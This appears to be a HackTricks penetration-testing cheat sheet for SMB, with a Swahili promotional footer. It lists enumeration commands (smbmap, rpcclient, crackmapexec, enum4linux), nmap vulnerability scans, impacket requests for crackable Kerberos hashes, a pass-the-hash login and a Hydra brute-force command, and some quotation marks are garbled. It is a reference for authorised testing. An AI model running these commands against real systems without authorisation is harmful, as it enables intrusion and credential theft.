Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‚ÄòNBT over IP‚Äô, Port 445 is ‚ÄòSMB over IP‚Äô. SMB stands for ‚ÄòServer Message Blocks‚Äô. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
